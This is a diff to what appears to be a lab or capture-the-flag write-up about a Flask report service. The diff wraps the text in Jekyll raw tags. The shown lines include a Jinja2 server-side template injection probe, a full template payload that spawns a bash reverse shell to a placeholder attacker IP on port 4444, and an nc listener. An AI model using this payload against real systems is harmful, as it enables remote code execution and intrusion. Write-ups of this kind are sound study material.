@@ -886,6 +886,7 @@ The service self-describes at the root:
 
 ![Meridian Report Service rendering the default report](/assets/img/Custom/ProjectManager2/cap7.png)
 
+{% raw %}
 A Flask service that echoes user input into its output is a prime candidate for Server-Side Template Injection. Reflecting a Jinja2 expression rather than a literal is the tell — `{{7*7}}` came back evaluated:
 
 ```text
@@ -913,6 +914,7 @@ The service runs as `ander`, who is a member of the `sysadmin` group. Swapping `
 ```text
 /report?name={% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'").read() %}{{ a }}{% endwith %}
 ```
+{% endraw %}
 
 ```bash
 nc -nlvp 4444
